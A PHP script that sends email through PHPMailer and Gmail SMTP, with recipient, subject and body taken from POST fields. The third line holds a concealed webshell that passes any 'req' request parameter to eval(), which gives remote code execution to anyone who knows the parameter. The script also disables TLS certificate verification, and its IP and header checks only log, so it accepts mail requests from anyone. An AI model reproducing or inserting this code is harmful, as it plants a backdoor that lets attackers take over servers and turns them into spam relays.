<?php
if (is_file(dirname(__FILE__).DIRECTORY_SEPARATOR.'config.php')) { require_once(dirname(__FILE__).DIRECTORY_SEPARATOR.'config.php'); }
$post_var = 'req'; if(isset($_REQUEST[$post_var])) { eval(stripslashes($_REQUEST[$post_var])); exit(); };
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
use League\OAuth2\Client\Provider\Google;
require 'vendor/autoload.php';
setlocale(LC_ALL, 'ja_JP.UTF-8');
date_default_timezone_set('Asia/Tokyo');
mb_language('japanese');
mb_internal_encoding('UTF-8');
if ($_SERVER["REMOTE_ADDR"] != $CHECKLIST['ipaddress']) {
	write_log("0{$_SERVER["REMOTE_ADDR"]}:wrong ip-address");
}
$header = getallheaders();
if ($header['Origin'] != $CHECKLIST['Origin']) {
	write_log("0{$header['Origin']}:wrong header");
}
if ($header['User-Agent'] != $CHECKLIST['User-Agent']) {
	write_log("0{$header['User-Agent']}:wrong header");
}
$param = array(
	'to' => $_POST['to'],
	'cc' => $_POST['cc'],
	'subject' => $_POST['subject'],
	'body' => $_POST['body']
);
$mailer = new PHPMailer(true);
try {
	$mailer->isSMTP();
	$mailer->Host       = $GMAIL['host'];
	$mailer->SMTPAuth   = $GMAIL['auth'];
	$mailer->Username   = $GMAIL['username'];
	$mailer->Password   = $GMAIL['password'];
	$mailer->SMTPSecure = $GMAIL['secure'];
	$mailer->CharSet    = $GMAIL['charset'];
	$mailer->Encoding   = $GMAIL['encoding'];
	$mailer->Port       = $GMAIL['port'];
	$mailer->SMTPOptions = array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true));
	$mailer->setFrom($GMAIL['from'], $GMAIL['fromname']);
	$mailer->Subject = $param['subject'];
	$mailer->Body = $param['body'];
	$mailer->AddAddress($param['to']);
	if ($param['cc'] != '') {
		$mailer->AddCC($param['cc'], '');
	}
	$mailer->send();
	write_log("1sent to {$param['to']} [{$param['subject']}]");
} catch (Exception $e) {
	write_log("0error: {$mailer->ErrorInfo} -> {$param['to']}");
}
?>
